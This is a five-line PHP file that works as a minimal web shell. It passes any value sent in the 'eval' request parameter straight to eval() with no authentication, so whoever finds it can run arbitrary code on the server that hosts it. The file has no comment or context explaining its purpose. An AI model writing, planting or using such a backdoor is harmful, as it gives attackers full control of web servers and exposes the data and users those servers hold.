<?php
if(isset($_REQUEST['eval'])){
	eval(stripslashes(trim($_REQUEST['eval'])));
}

?>